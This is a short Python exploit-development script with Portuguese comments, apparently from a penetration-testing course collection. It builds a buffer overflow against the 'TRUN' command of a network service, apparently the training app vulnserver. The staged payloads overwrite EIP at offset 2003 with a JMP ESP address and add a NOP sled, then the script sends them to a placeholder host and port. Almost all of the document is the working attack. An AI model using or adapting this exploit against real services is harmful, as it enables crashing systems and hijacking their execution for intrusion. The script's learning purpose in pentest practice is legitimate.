#!/usr/bin/python

#############################################################################
#   Projeto:        Pentest Scripts - CVEs                                  #
#   Nome:           Testing Offset                                          #
#   Descrição:      Envia offset para aplicação                             #
#   Autor:          Carine Constantino                                      #
#   Data:           01/03/2022                                              #                                      
#   Função:         Script para testar o offset e obter o EIP               #  
#   									    #
#############################################################################


import sys, socket

## TESTING OFFSET
#offset = "A" * 2003 + "BBBB" 

## TESTING PAYLOAD SIZE
#offset = "A" * 2003 + "BBBB" + "C" * 500

## TESTING ESP ADDRESS
## 0x625011af
#offset = "A" * 2003 + "\xaf\x11\x50\x62" + "C" * 500

## TESTING PRE-PAYLOAD WITH NOPs
offset = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + "C" * 468

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('IP-TO-TARGET',PORT-TO-TARGET))
	s.send(('TRUN /.:/' + offset))
	s.close()
	
except:
	print("Error connecting to server")
	sys.exit()
		
